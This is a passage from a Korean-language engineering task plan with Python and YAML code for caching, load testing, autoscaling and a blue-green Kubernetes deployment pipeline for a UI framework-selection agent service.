        scores = (scores - scores.min()) / (scores.max() - scores.min())

        return scores

    def _vectorize_requirements(
        self,
        requirements: List[str]
    ) -> np.ndarray:
        """요구사항 벡터화"""

        if self.vectorizer is None:
            from sklearn.feature_extraction.text import TfidfVectorizer
            self.vectorizer = TfidfVectorizer(max_features=100)

        return self.vectorizer.fit_transform(requirements).toarray()
```

**I/O 최적화**:

```python
class IOOptimizer:
    """I/O 작업 최적화"""

    def __init__(self):
        self.connection_pool = None
        self.prefetch_queue = asyncio.Queue(maxsize=100)

    async def initialize(self):
        """I/O 최적화 초기화"""

        # 연결 풀 생성
        self.connection_pool = await aioredis.create_pool(
            'redis://localhost',
            minsize=5,
            maxsize=20
        )

        # 프리페치 워커 시작
        asyncio.create_task(self._prefetch_worker())

    async def optimized_data_fetch(
        self,
        keys: List[str]
    ) -> Dict[str, Any]:
        """최적화된 데이터 페치"""

        # 파이프라인을 사용한 일괄 읽기
        async with self.connection_pool.get() as conn:
            pipe = conn.pipeline()

            for key in keys:
                pipe.get(key)

            results = await pipe.execute()

        return dict(zip(keys, results))

    async def _prefetch_worker(self):
        """프리페치 워커"""

        while True:
            try:
                # 자주 사용되는 데이터 미리 로드
                common_keys = await self._identify_hot_keys()

                for key in common_keys:
                    data = await self._fetch_and_cache(key)
                    await self.prefetch_queue.put((key, data))

                await asyncio.sleep(60)  # 1분마다 갱신

            except Exception as e:
                print(f"Prefetch error: {e}")
                await asyncio.sleep(5)
```

**응답 시간 모니터링**:

```python
class ResponseTimeMonitor:
    """응답 시간 모니터링 및 분석"""

    def __init__(self):
        self.response_times = []
        self.slow_query_threshold = 2000  # 2초

    async def monitor_and_optimize(
        self,
        func,
        *args,
        **kwargs
    ):
        """함수 실행 모니터링 및 최적화"""

        import time

        start_time = time.time()

        try:
            # 실행
            result = await func(*args, **kwargs)

            # 응답 시간 기록
            elapsed = (time.time() - start_time) * 1000  # ms
            self.response_times.append(elapsed)

            # 느린 쿼리 분석
            if elapsed > self.slow_query_threshold:
                await self._analyze_slow_query(
                    func.__name__,
                    args,
                    kwargs,
                    elapsed
                )

            return result

        except Exception as e:
            elapsed = (time.time() - start_time) * 1000
            await self._log_error(func.__name__, e, elapsed)
            raise

    async def _analyze_slow_query(
        self,
        func_name: str,
        args: tuple,
        kwargs: dict,
        elapsed: float
    ):
        """느린 쿼리 분석"""

        analysis = {
            'function': func_name,
            'elapsed_ms': elapsed,
            'timestamp': datetime.utcnow(),
            'args_size': len(str(args)),
            'kwargs_size': len(str(kwargs))
        }

        # 프로파일링 정보 수집
        if elapsed > self.slow_query_threshold * 2:
            import cProfile
            import pstats
            from io import StringIO

            profiler = cProfile.Profile()
            profiler.enable()

            # 재실행하여 프로파일링
            await func(*args, **kwargs)

            profiler.disable()

            s = StringIO()
            ps = pstats.Stats(profiler, stream=s).sort_stats('cumulative')
            ps.print_stats(10)

            analysis['profile'] = s.getvalue()

        # 분석 결과 저장
        await self._save_analysis(analysis)
```

**검증 기준**:

- [ ] 평균 응답 시간 < 1초
- [ ] P95 응답 시간 < 2초
- [ ] 병렬 처리 구현
- [ ] 효율적인 I/O 처리

### SubTask 4.20.2: 캐싱 전략 구현

**담당자**: 캐시 전문가  
**예상 소요시간**: 10시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/caching/cache_strategy.py
from typing import Dict, Any, Optional, List, Tuple
import hashlib
import json
from datetime import datetime, timedelta
import asyncio
from abc import ABC, abstractmethod

class CacheStrategy(ABC):
    """캐시 전략 추상 클래스"""

    @abstractmethod
    async def get(self, key: str) -> Optional[Any]:
        pass

    @abstractmethod
    async def set(self, key: str, value: Any, ttl: Optional[int] = None):
        pass

    @abstractmethod
    async def invalidate(self, pattern: str):
        pass

class MultiLayerCache:
    """다층 캐시 시스템"""

    def __init__(self):
        self.l1_cache = {}  # 메모리 캐시 (빠름, 작음)
        self.l2_cache = None  # Redis 캐시 (중간 속도, 중간 크기)
        self.l3_cache = None  # 디스크 캐시 (느림, 큼)

        self.cache_stats = {
            'l1_hits': 0,
            'l1_misses': 0,
            'l2_hits': 0,
            'l2_misses': 0,
            'l3_hits': 0,
            'l3_misses': 0
        }

    async def initialize(self, config: Dict[str, Any]):
        """캐시 시스템 초기화"""

        # L2 캐시 (Redis) 초기화
        import aioredis
        self.l2_cache = await aioredis.create_redis_pool(
            config['redis_url'],
            maxsize=10
        )

        # L3 캐시 (디스크) 초기화
        from .disk_cache import DiskCache
        self.l3_cache = DiskCache(
            cache_dir=config.get('cache_dir', '/tmp/ui_agent_cache'),
            max_size_mb=config.get('max_disk_cache_mb', 1000)
        )

        # 캐시 워머 시작
        asyncio.create_task(self._cache_warmer())

    async def get(
        self,
        key: str,
        cache_levels: List[int] = [1, 2, 3]
    ) -> Optional[Any]:
        """캐시에서 값 조회"""

        cache_key = self._generate_key(key)

        # L1 캐시 확인
        if 1 in cache_levels:
            value = self.l1_cache.get(cache_key)
            if value is not None:
                self.cache_stats['l1_hits'] += 1
                return value['data']
            self.cache_stats['l1_misses'] += 1

        # L2 캐시 확인
        if 2 in cache_levels and self.l2_cache:
            value = await self.l2_cache.get(cache_key)
            if value:
                self.cache_stats['l2_hits'] += 1
                data = json.loads(value)

                # L1 캐시에 프로모션
                await self._promote_to_l1(cache_key, data)

                return data
            self.cache_stats['l2_misses'] += 1

        # L3 캐시 확인
        if 3 in cache_levels and self.l3_cache:
            value = await self.l3_cache.get(cache_key)
            if value:
                self.cache_stats['l3_hits'] += 1

                # 상위 캐시로 프로모션
                await self._promote_to_higher_layers(cache_key, value)

                return value
            self.cache_stats['l3_misses'] += 1

        return None

    async def set(
        self,
        key: str,
        value: Any,
        ttl: Optional[int] = None,
        cache_levels: List[int] = [1, 2]
    ):
        """캐시에 값 저장"""

        cache_key = self._generate_key(key)
        cache_data = {
            'data': value,
            'timestamp': datetime.utcnow().isoformat(),
            'ttl': ttl
        }

        # L1 캐시 저장
        if 1 in cache_levels:
            self._set_l1_with_eviction(cache_key, cache_data, ttl)

        # L2 캐시 저장
        if 2 in cache_levels and self.l2_cache:
            await self.l2_cache.setex(
                cache_key,
                ttl or 3600,
                json.dumps(value)
            )

        # L3 캐시 저장 (큰 데이터나 장기 보관용)
        if 3 in cache_levels and self.l3_cache:
            if self._should_cache_to_disk(value):
                await self.l3_cache.set(cache_key, value, ttl)

    def _generate_key(self, key: str) -> str:
        """캐시 키 생성"""

        if isinstance(key, dict):
            key_str = json.dumps(key, sort_keys=True)
        else:
            key_str = str(key)

        return f"ui_agent:{hashlib.md5(key_str.encode()).hexdigest()}"

    def _set_l1_with_eviction(
        self,
        key: str,
        value: Any,
        ttl: Optional[int]
    ):
        """LRU 방식으로 L1 캐시 설정"""

        max_l1_size = 1000

        if len(self.l1_cache) >= max_l1_size:
            # 가장 오래된 항목 제거
            oldest_key = min(
                self.l1_cache.keys(),
                key=lambda k: self.l1_cache[k].get('timestamp', '')
            )
            del self.l1_cache[oldest_key]

        self.l1_cache[key] = value
```

**지능형 캐싱**:

```python
class IntelligentCache:
    """지능형 캐싱 시스템"""

    def __init__(self, multi_layer_cache: MultiLayerCache):
        self.cache = multi_layer_cache
        self.access_patterns = {}
        self.cache_effectiveness = {}

    async def smart_get(
        self,
        key: str,
        compute_func: Optional[Callable] = None,
        ttl_strategy: str = 'adaptive'
    ) -> Any:
        """지능형 캐시 조회"""

        # 액세스 패턴 기록
        self._record_access(key)

        # 캐시 조회
        cached_value = await self.cache.get(key)

        if cached_value is not None:
            # 캐시 효과성 추적
            self._track_cache_hit(key)
            return cached_value

        # 캐시 미스
        self._track_cache_miss(key)

        if compute_func:
            # 값 계산
            value = await compute_func()

            # 적응형 TTL 계산
            ttl = self._calculate_adaptive_ttl(key, ttl_strategy)

            # 캐시 저장 결정
            if self._should_cache(key, value):
                cache_levels = self._determine_cache_levels(key, value)
                await self.cache.set(key, value, ttl, cache_levels)

            return value

        return None

    def _calculate_adaptive_ttl(
        self,
        key: str,
        strategy: str
    ) -> int:
        """적응형 TTL 계산"""

        base_ttl = 3600  # 1시간

        if strategy == 'adaptive':
            # 액세스 빈도 기반
            access_count = self.access_patterns.get(key, {}).get('count', 0)

            if access_count > 100:
                return base_ttl * 4  # 자주 액세스되면 더 오래 캐시
            elif access_count > 10:
                return base_ttl * 2
            else:
                return base_ttl

        elif strategy == 'sliding':
            # 슬라이딩 윈도우
            last_access = self.access_patterns.get(key, {}).get('last_access')
            if last_access:
                time_since_last = (datetime.utcnow() - last_access).seconds
                if time_since_last < 300:  # 5분 이내 재액세스
                    return base_ttl * 2

        return base_ttl

    def _should_cache(self, key: str, value: Any) -> bool:
        """캐싱 여부 결정"""

        # 크기 확인
        import sys
        value_size = sys.getsizeof(value)

        if value_size > 10 * 1024 * 1024:  # 10MB 초과
            return False

        # 캐시 효과성 확인
        effectiveness = self.cache_effectiveness.get(key, {})
        hit_rate = effectiveness.get('hit_rate', 0)

        if hit_rate < 0.1 and effectiveness.get('attempts', 0) > 10:
            # 히트율이 너무 낮으면 캐싱하지 않음
            return False

        return True
```

**캐시 무효화 전략**:

```python
class CacheInvalidator:
    """캐시 무효화 관리"""

    def __init__(self, cache: MultiLayerCache):
        self.cache = cache
        self.invalidation_rules = {}
        self.dependency_graph = {}

    async def register_dependency(
        self,
        key: str,
        depends_on: List[str]
    ):
        """캐시 의존성 등록"""

        for dep in depends_on:
            if dep not in self.dependency_graph:
                self.dependency_graph[dep] = set()
            self.dependency_graph[dep].add(key)

    async def invalidate(
        self,
        key: str,
        cascade: bool = True
    ):
        """캐시 무효화"""

        # 직접 무효화
        await self._invalidate_key(key)

        # 계단식 무효화
        if cascade and key in self.dependency_graph:
            dependent_keys = self.dependency_graph[key]

            for dep_key in dependent_keys:
                await self._invalidate_key(dep_key)

    async def invalidate_by_pattern(
        self,
        pattern: str
    ):
        """패턴 기반 무효화"""

        # L1 캐시 무효화
        keys_to_remove = [
            k for k in self.cache.l1_cache.keys()
            if pattern in k
        ]

        for key in keys_to_remove:
            del self.cache.l1_cache[key]

        # L2 캐시 무효화
        if self.cache.l2_cache:
            # Redis SCAN 사용
            cursor = 0
            while True:
                cursor, keys = await self.cache.l2_cache.scan(
                    cursor,
                    match=f"*{pattern}*"
                )

                if keys:
                    await self.cache.l2_cache.delete(*keys)

                if cursor == 0:
                    break

    async def setup_ttl_based_invalidation(self):
        """TTL 기반 자동 무효화 설정"""

        async def ttl_worker():
            while True:
                try:
                    # L1 캐시 TTL 확인
                    now = datetime.utcnow()
                    expired_keys = []

                    for key, value in self.cache.l1_cache.items():
                        if 'timestamp' in value and 'ttl' in value:
                            timestamp = datetime.fromisoformat(value['timestamp'])
                            if (now - timestamp).seconds > value['ttl']:
                                expired_keys.append(key)

                    for key in expired_keys:
                        del self.cache.l1_cache[key]

                    await asyncio.sleep(60)  # 1분마다 확인

                except Exception as e:
                    print(f"TTL worker error: {e}")
                    await asyncio.sleep(60)

        asyncio.create_task(ttl_worker())
```

**캐시 워밍**:

```python
class CacheWarmer:
    """캐시 예열 시스템"""

    def __init__(self, cache: MultiLayerCache):
        self.cache = cache
        self.warm_up_queries = []

    async def warm_up(self):
        """캐시 예열 실행"""

        # 자주 사용되는 프레임워크 데이터 로드
        popular_frameworks = ['react', 'vue', 'angular', 'next.js']

        for framework in popular_frameworks:
            # 기본 프레임워크 정보
            await self._warm_framework_data(framework)

            # 벤치마크 데이터
            await self._warm_benchmark_data(framework)

            # 일반적인 프로젝트 타입별 추천
            await self._warm_common_recommendations(framework)

    async def _warm_framework_data(self, framework: str):
        """프레임워크 데이터 예열"""

        key = f"framework_data:{framework}"

        # 실제 데이터 로드 로직
        data = {
            'name': framework,
            'version': self._get_latest_version(framework),
            'features': self._get_framework_features(framework),
            'ecosystem': self._get_ecosystem_info(framework)
        }

        await self.cache.set(key, data, ttl=7200)  # 2시간

    async def _warm_common_recommendations(self, framework: str):
        """일반적인 추천 시나리오 예열"""

        common_scenarios = [
            {'type': 'web', 'size': 'small'},
            {'type': 'web', 'size': 'large'},
            {'type': 'mobile', 'size': 'medium'},
            {'type': 'enterprise', 'size': 'large'}
        ]

        for scenario in common_scenarios:
            key = f"recommendation:{framework}:{scenario['type']}:{scenario['size']}"

            # 미리 계산된 추천
            recommendation = await self._compute_recommendation(
                framework,
                scenario
            )

            await self.cache.set(key, recommendation, ttl=3600)
```

**검증 기준**:

- [ ] 다층 캐시 시스템 구현
- [ ] 지능형 TTL 관리
- [ ] 효율적인 무효화 전략
- [ ] 캐시 예열 메커니즘

### SubTask 4.20.3: 부하 테스트 및 스케일링

**담당자**: 인프라 엔지니어  
**예상 소요시간**: 12시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/scaling/load_testing.py
from typing import Dict, List, Any, Optional
import asyncio
import aiohttp
from datetime import datetime
import statistics
from dataclasses import dataclass

@dataclass
class LoadTestResult:
    """부하 테스트 결과"""
    total_requests: int
    successful_requests: int
    failed_requests: int
    average_response_time: float
    median_response_time: float
    p95_response_time: float
    p99_response_time: float
    requests_per_second: float
    error_rate: float
    test_duration: float

class LoadTester:
    """부하 테스트 실행기"""

    def __init__(self, base_url: str):
        self.base_url = base_url
        self.results = []

    async def run_load_test(
        self,
        concurrent_users: int,
        duration_seconds: int,
        requests_per_user: int
    ) -> LoadTestResult:
        """부하 테스트 실행"""

        print(f"Starting load test: {concurrent_users} users, {duration_seconds}s")

        start_time = datetime.utcnow()

        # 사용자 시뮬레이션
        tasks = []
        for user_id in range(concurrent_users):
            task = asyncio.create_task(
                self._simulate_user(
                    user_id,
                    requests_per_user,
                    duration_seconds
                )
            )
            tasks.append(task)

        # 모든 사용자 완료 대기
        await asyncio.gather(*tasks)

        end_time = datetime.utcnow()
        test_duration = (end_time - start_time).total_seconds()

        # 결과 집계
        return self._aggregate_results(test_duration)

    async def _simulate_user(
        self,
        user_id: int,
        requests_per_user: int,
        duration_seconds: int
    ):
        """사용자 시뮬레이션"""

        async with aiohttp.ClientSession() as session:
            end_time = datetime.utcnow() + timedelta(seconds=duration_seconds)
            request_count = 0

            while datetime.utcnow() < end_time and request_count < requests_per_user:
                try:
                    # 다양한 요청 시나리오
                    scenario = self._get_test_scenario(user_id, request_count)

                    start = datetime.utcnow()

                    async with session.post(
                        f"{self.base_url}/api/v1/select-framework",
                        json=scenario,
                        timeout=aiohttp.ClientTimeout(total=30)
                    ) as response:
                        response_data = await response.json()

                    elapsed = (datetime.utcnow() - start).total_seconds()

                    self.results.append({
                        'user_id': user_id,
                        'request_id': request_count,
                        'success': response.status == 200,
                        'response_time': elapsed,
                        'status_code': response.status,
                        'timestamp': datetime.utcnow()
                    })

                except Exception as e:
                    self.results.append({
                        'user_id': user_id,
                        'request_id': request_count,
                        'success': False,
                        'response_time': None,
                        'error': str(e),
                        'timestamp': datetime.utcnow()
                    })

                request_count += 1

                # 사용자 행동 시뮬레이션 (think time)
                await asyncio.sleep(random.uniform(0.5, 2.0))

    def _aggregate_results(self, test_duration: float) -> LoadTestResult:
        """결과 집계"""

        successful = [r for r in self.results if r['success']]
        failed = [r for r in self.results if not r['success']]

        response_times = [
            r['response_time'] for r in successful
            if r['response_time'] is not None
        ]

        if not response_times:
            return LoadTestResult(
                total_requests=len(self.results),
                successful_requests=0,
                failed_requests=len(failed),
                average_response_time=0,
                median_response_time=0,
                p95_response_time=0,
                p99_response_time=0,
                requests_per_second=0,
                error_rate=1.0,
                test_duration=test_duration
            )

        return LoadTestResult(
            total_requests=len(self.results),
            successful_requests=len(successful),
            failed_requests=len(failed),
            average_response_time=statistics.mean(response_times),
            median_response_time=statistics.median(response_times),
            p95_response_time=statistics.quantiles(response_times, n=20)[18],
            p99_response_time=statistics.quantiles(response_times, n=100)[98],
            requests_per_second=len(self.results) / test_duration,
            error_rate=len(failed) / len(self.results),
            test_duration=test_duration
        )
```

**자동 스케일링 구현**:

```python
class AutoScaler:
    """자동 스케일링 관리"""

    def __init__(self):
        self.metrics_collector = MetricsCollector()
        self.scaling_policies = {}
        self.current_instances = 1
        self.min_instances = 1
        self.max_instances = 10

    async def initialize(self, config: Dict[str, Any]):
        """자동 스케일링 초기화"""

        self.min_instances = config.get('min_instances', 1)
        self.max_instances = config.get('max_instances', 10)

        # 스케일링 정책 설정
        self.scaling_policies = {
            'cpu_based': {
                'metric': 'cpu_usage',
                'scale_up_threshold': 70,
                'scale_down_threshold': 30,
                'cooldown_period': 300  # 5분
            },
            'response_time_based': {
                'metric': 'avg_response_time',
                'scale_up_threshold': 2000,  # 2초
                'scale_down_threshold': 500,  # 0.5초
                'cooldown_period': 300
            },
            'queue_based': {
                'metric': 'queue_depth',
                'scale_up_threshold': 100,
                'scale_down_threshold': 10,
                'cooldown_period': 180
            }
        }

        # 스케일링 모니터 시작
        asyncio.create_task(self._scaling_monitor())

    async def _scaling_monitor(self):
        """스케일링 모니터링 루프"""

        last_scaling_time = {}

        while True:
            try:
                # 현재 메트릭 수집
                current_metrics = await self.metrics_collector.collect()

                # 각 정책 평가
                for policy_name, policy in self.scaling_policies.items():
                    # 쿨다운 기간 확인
                    if policy_name in last_scaling_time:
                        time_since_last = (
                            datetime.utcnow() - last_scaling_time[policy_name]
                        ).seconds

                        if time_since_last < policy['cooldown_period']:
                            continue

                    # 스케일링 결정
                    metric_value = current_metrics.get(policy['metric'], 0)

                    if metric_value > policy['scale_up_threshold']:
                        # 스케일 업
                        if self.current_instances < self.max_instances:
                            await self._scale_up()
                            last_scaling_time[policy_name] = datetime.utcnow()

                    elif metric_value < policy['scale_down_threshold']:
                        # 스케일 다운
                        if self.current_instances > self.min_instances:
                            await self._scale_down()
                            last_scaling_time[policy_name] = datetime.utcnow()

                await asyncio.sleep(30)  # 30초마다 확인

            except Exception as e:
                print(f"Scaling monitor error: {e}")
                await asyncio.sleep(60)

    async def _scale_up(self):
        """인스턴스 증가"""

        new_instance_count = min(
            self.current_instances + 1,
            self.max_instances
        )

        print(f"Scaling up from {self.current_instances} to {new_instance_count}")

        # Kubernetes API 호출
        await self._update_deployment_replicas(new_instance_count)

        self.current_instances = new_instance_count

        # 스케일링 이벤트 기록
        await self._log_scaling_event('scale_up', new_instance_count)
```

**Kubernetes 스케일링 설정**:

```yaml
# k8s/horizontal-pod-autoscaler.yaml
apiVersion: autoscaling/v2
kind: HorizontalPodAutoscaler
metadata:
  name: ui-selection-agent-hpa
  namespace: t-developer
spec:
  scaleTargetRef:
    apiVersion: apps/v1
    kind: Deployment
    name: ui-selection-agent
  minReplicas: 2
  maxReplicas: 20
  metrics:
    - type: Resource
      resource:
        name: cpu
        target:
          type: Utilization
          averageUtilization: 70
    - type: Resource
      resource:
        name: memory
        target:
          type: Utilization
          averageUtilization: 80
    - type: Pods
      pods:
        metric:
          name: http_requests_per_second
        target:
          type: AverageValue
          averageValue: "100"
    - type: Object
      object:
        metric:
          name: response_time_p95
        describedObject:
          apiVersion: v1
          kind: Service
          name: ui-selection-agent
        target:
          type: Value
          value: "2000m" # 2초
  behavior:
    scaleDown:
      stabilizationWindowSeconds: 300
      policies:
        - type: Percent
          value: 10
          periodSeconds: 60
        - type: Pods
          value: 2
          periodSeconds: 60
      selectPolicy: Min
    scaleUp:
      stabilizationWindowSeconds: 60
      policies:
        - type: Percent
          value: 100
          periodSeconds: 15
        - type: Pods
          value: 5
          periodSeconds: 60
      selectPolicy: Max
```

**부하 분산 전략**:

```python
class LoadBalancer:
    """부하 분산 관리"""

    def __init__(self):
        self.backends = []
        self.health_checker = HealthChecker()
        self.load_balancing_algorithm = 'weighted_round_robin'

    async def initialize(self, backends: List[Dict[str, Any]]):
        """부하 분산기 초기화"""

        self.backends = [
            {
                'id': backend['id'],
                'url': backend['url'],
                'weight': backend.get('weight', 1),
                'healthy': True,
                'active_connections': 0,
                'response_times': []
            }
            for backend in backends
        ]

        # 헬스 체크 시작
        asyncio.create_task(self._health_check_loop())

    async def get_backend(self) -> Optional[Dict[str, Any]]:
        """백엔드 선택"""

        healthy_backends = [
            b for b in self.backends
            if b['healthy']
        ]

        if not healthy_backends:
            return None

        if self.load_balancing_algorithm == 'round_robin':
            return self._round_robin_select(healthy_backends)
        elif self.load_balancing_algorithm == 'least_connections':
            return self._least_connections_select(healthy_backends)
        elif self.load_balancing_algorithm == 'weighted_round_robin':
            return self._weighted_round_robin_select(healthy_backends)
        elif self.load_balancing_algorithm == 'response_time':
            return self._response_time_select(healthy_backends)

    def _least_connections_select(
        self,
        backends: List[Dict[str, Any]]
    ) -> Dict[str, Any]:
        """최소 연결 수 기준 선택"""

        return min(backends, key=lambda b: b['active_connections'])

    def _response_time_select(
        self,
        backends: List[Dict[str, Any]]
    ) -> Dict[str, Any]:
        """응답 시간 기준 선택"""

        # 평균 응답 시간이 가장 낮은 백엔드
        backend_scores = []

        for backend in backends:
            if backend['response_times']:
                avg_response = statistics.mean(backend['response_times'][-10:])
            else:
                avg_response = 0

            backend_scores.append((backend, avg_response))

        return min(backend_scores, key=lambda x: x[1])[0]
```

**성능 테스트 시나리오**:

```python
class PerformanceTestSuite:
    """성능 테스트 스위트"""

    def __init__(self):
        self.test_scenarios = []
        self.results = {}

    async def run_comprehensive_tests(self):
        """포괄적 성능 테스트 실행"""

        # 1. 기본 부하 테스트
        await self._run_baseline_test()

        # 2. 스파이크 테스트
        await self._run_spike_test()

        # 3. 내구성 테스트
        await self._run_endurance_test()

        # 4. 스트레스 테스트
        await self._run_stress_test()

        # 5. 확장성 테스트
        await self._run_scalability_test()

        # 결과 분석
        return self._analyze_results()

    async def _run_spike_test(self):
        """스파이크 테스트"""

        load_tester = LoadTester("http://localhost:8080")

        # 정상 부하
        normal_result = await load_tester.run_load_test(
            concurrent_users=10,
            duration_seconds=60,
            requests_per_user=100
        )

        # 갑작스런 스파이크
        spike_result = await load_tester.run_load_test(
            concurrent_users=100,
            duration_seconds=30,
            requests_per_user=50
        )

        # 정상으로 복귀
        recovery_result = await load_tester.run_load_test(
            concurrent_users=10,
            duration_seconds=60,
            requests_per_user=100
        )

        self.results['spike_test'] = {
            'normal': normal_result,
            'spike': spike_result,
            'recovery': recovery_result,
            'spike_handled': spike_result.error_rate < 0.05,
            'recovery_time': self._calculate_recovery_time(recovery_result)
        }

    async def _run_scalability_test(self):
        """확장성 테스트"""

        results = []

        # 점진적으로 부하 증가
        for concurrent_users in [10, 50, 100, 200, 500]:
            result = await LoadTester("http://localhost:8080").run_load_test(
                concurrent_users=concurrent_users,
                duration_seconds=120,
                requests_per_user=100
            )

            results.append({
                'concurrent_users': concurrent_users,
                'avg_response_time': result.average_response_time,
                'throughput': result.requests_per_second,
                'error_rate': result.error_rate
            })

            # 쿨다운
            await asyncio.sleep(30)

        # 선형성 분석
        self.results['scalability_test'] = {
            'results': results,
            'linear_scalability': self._check_linear_scalability(results),
            'breaking_point': self._find_breaking_point(results)
        }
```

**검증 기준**:

- [ ] 1000+ RPS 처리 능력
- [ ] 자동 스케일링 구현
- [ ] 부하 분산 전략
- [ ] 성능 저하 없는 확장

### SubTask 4.20.4: UI Agent 최종 검증 및 배포

**담당자**: 배포 관리자  
**예상 소요시간**: 10시간

**작업 내용**:

```python
# backend/src/agents/implementations/ui_selection/deployment/final_validation.py
from typing import Dict, List, Any, Optional
import asyncio
from datetime import datetime

class FinalValidation:
    """UI Agent 최종 검증"""

    def __init__(self):
        self.validation_checklist = []
        self.test_results = {}
        self.deployment_readiness = False

    async def run_final_validation(self) -> Dict[str, Any]:
        """최종 검증 실행"""

        print("Starting UI Agent final validation...")

        # 1. 기능 검증
        functional_results = await self._validate_functionality()

        # 2. 성능 검증
        performance_results = await self._validate_performance()

        # 3. 보안 검증
        security_results = await self._validate_security()

        # 4. 통합 검증
        integration_results = await self._validate_integration()

        # 5. 문서화 검증
        documentation_results = await self._validate_documentation()

        # 6. 배포 준비성 평가
        self.deployment_readiness = self._assess_deployment_readiness({
            'functional': functional_results,
            'performance': performance_results,
            'security': security_results,
            'integration': integration_results,
            'documentation': documentation_results
        })

        return {
            'validation_timestamp': datetime.utcnow().isoformat(),
            'deployment_ready': self.deployment_readiness,
            'results': {
                'functional': functional_results,
                'performance': performance_results,
                'security': security_results,
                'integration': integration_results,
                'documentation': documentation_results
            },
            'checklist': self.validation_checklist
        }

    async def _validate_functionality(self) -> Dict[str, Any]:
        """기능 검증"""

        test_cases = [
            {
                'name': 'basic_framework_selection',
                'input': {
                    'project_description': 'Simple web application',
                    'requirements': ['responsive', 'fast']
                },
                'expected': {
                    'has_recommendation': True,
                    'has_alternatives': True,
                    'confidence_range': (0.5, 1.0)
                }
            },
            {
                'name': 'complex_requirements',
                'input': {
                    'project_description': 'Enterprise SaaS platform',
                    'requirements': [
                        'microservices',
                        'real-time',
                        'multi-tenant',
                        'scalable'
                    ],
                    'constraints': {
                        'team_size': 20,
                        'timeline': '6 months'
                    }
                },
                'expected': {
                    'framework_in': ['angular', 'react', 'vue'],
                    'has_migration_path': True
                }
            },
            {
                'name': 'edge_cases',
                'input': {
                    'project_description': '',
                    'requirements': []
                },
                'expected': {
                    'handles_gracefully': True,
                    'provides_default': True
                }
            }
        ]

        results = []

        for test_case in test_cases:
            result = await self._run_functional_test(test_case)
            results.append(result)

        return {
            'total_tests': len(test_cases),
            'passed': sum(1 for r in results if r['passed']),
            'failed': sum(1 for r in results if not r['passed']),
            'test_results': results
        }
```

**배포 파이프라인**:

```yaml
# .github/workflows/ui-agent-deployment.yaml
name: UI Agent Deployment Pipeline

on:
  push:
    branches: [main]
    paths:
      - "backend/src/agents/implementations/ui_selection/**"
  workflow_dispatch:

env:
  REGISTRY: ghcr.io
  IMAGE_NAME: t-developer/ui-selection-agent

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Set up Python
        uses: actions/setup-python@v4
        with:
          python-version: "3.11"

      - name: Install dependencies
        run: |
          pip install -r requirements.txt
          pip install pytest pytest-asyncio pytest-cov

      - name: Run unit tests
        run: |
          pytest tests/agents/ui_selection/unit/ \
            --cov=agents.implementations.ui_selection \
            --cov-report=xml

      - name: Run integration tests
        run: |
          docker-compose -f docker-compose.test.yml up -d
          pytest tests/agents/ui_selection/integration/
          docker-compose -f docker-compose.test.yml down

      - name: Upload coverage
        uses: codecov/codecov-action@v3

  build:
    needs: test
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v3

      - name: Set up Docker Buildx
        uses: docker/setup-buildx-action@v2

      - name: Log in to registry
        uses: docker/login-action@v2
        with:
          registry: ${{ env.REGISTRY }}
          username: ${{ github.actor }}
          password: ${{ secrets.GITHUB_TOKEN }}

      - name: Build and push
        uses: docker/build-push-action@v4
        with:
          context: backend/src/agents/implementations/ui_selection
          push: true
          tags: |
            ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:latest
            ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}
          cache-from: type=gha
          cache-to: type=gha,mode=max

  deploy-staging:
    needs: build
    runs-on: ubuntu-latest
    environment: staging
    steps:
      - name: Deploy to staging
        uses: azure/k8s-deploy@v4
        with:
          manifests: |
            k8s/ui-selection-agent-deployment.yaml
            k8s/ui-selection-agent-service.yaml
          images: |
            ${{ env.REGISTRY }}/${{ env.IMAGE_NAME }}:${{ github.sha }}
          namespace: t-developer-staging

      - name: Run smoke tests
        run: |
          kubectl wait --for=condition=ready pod \
            -l app=ui-selection-agent \
            -n t-developer-staging \
            --timeout=300s

          curl -f http://ui-selection-agent.staging/health || exit 1

  deploy-production:
    needs: deploy-staging
    runs-on: ubuntu-latest
    environment: production
    steps:
      - name: Blue-Green deployment
        run: |
          # Create new deployment (green)
          kubectl apply -f k8s/ui-selection-agent-deployment.yaml \
            -n t-developer \
            --dry-run=client -o yaml | \
            sed 's/ui-selection-agent/ui-selection-agent-green/g' | \
            kubectl apply -f -
            
          # Wait for green deployment
          kubectl wait --for=condition=ready pod \
            -l app=ui-selection-agent-green \
            -n t-developer \
            --timeout=300s
            
          # Switch traffic
          kubectl patch service ui-selection-agent \
            -n t-developer \
            -p '{"spec":{"selector":{"app":"ui-selection-agent-green"}}}'
            
          # Delete old deployment
          kubectl delete deployment ui-selection-agent -n t-developer

          # Rename green to primary
          kubectl patch deployment ui-selection-agent-green \
            -n t-developer \
            --type json \
            -p '[{"op": "replace", "path": "/metadata/name", "value": "ui-selection-agent"}]'
```

**모니터링 대시보드 설정**:

```python
class DeploymentMonitor:
    """배포 모니터링"""

    def __init__(self):
        self.metrics = {}
        self.alerts = []

    async def monitor_deployment(
        self,
        deployment_id: str,
        duration_minutes: int = 30
    ):
        """배포 모니터링"""

        start_time = datetime.utcnow()
        end_time = start_time + timedelta(minutes=duration_minutes)

        while datetime.utcnow() < end_time:
            # 주요 메트릭 수집
            current_metrics = await self._collect_deployment_metrics()

            # 이상 징후 감지
            anomalies = self._detect_anomalies(current_metrics)

            if anomalies:
                await self._handle_anomalies(anomalies)

            # 5분마다 상태 보고
            if datetime.utcnow().minute % 5 == 0:
                await self._report_status(current_metrics)

            await asyncio.sleep(30)

        return self._generate_deployment_report()

    async def _collect_deployment_metrics(self) -> Dict[str, Any]:
        """배포 메트릭 수집"""

        return {
            'error_rate': await self._get_error_rate(),
            'response_time': await self._get_response_time(),
            'cpu_usage': await self._get_cpu_usage(),
            'memory_usage': await self._get_memory_usage(),
            'active_connections': await self._get_active_connections(),
            'pod_status': await self._get_pod_status()
        }
```

**최종 체크리스트**:

```python
class DeploymentChecklist:
    """배포 체크리스트"""

    CHECKLIST_ITEMS = [
        # 기능 요구사항
        {
            'category': 'functionality',
            'items': [
                'Framework selection working correctly',
                'All supported frameworks included',
                'Error handling implemented',
                'Fallback mechanisms in place'
            ]
        },
        # 성능 요구사항
        {
            'category': 'performance',
            'items': [
